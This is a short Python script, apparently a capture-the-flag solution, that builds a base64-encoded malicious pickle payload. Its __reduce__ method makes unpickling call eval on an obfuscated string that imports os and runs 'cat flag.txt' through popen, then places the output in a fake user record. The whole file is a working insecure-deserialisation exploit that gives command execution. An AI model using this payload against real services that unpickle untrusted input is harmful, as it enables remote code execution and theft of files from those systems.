





import pickle
import base64
import os

cmd = "{'name':__impor"+"t__('o'+'s').pope"+"n('cat flag.txt').read(), 'userid':1, 'password':'wowowowo'}"

class hehe:
    def __reduce__(self):
        return eval, (cmd,)


obj = hehe()
converted = pickle.dumps(obj)
# print(base64.b64encode(converted))
print(base64.b64encode(converted).decode())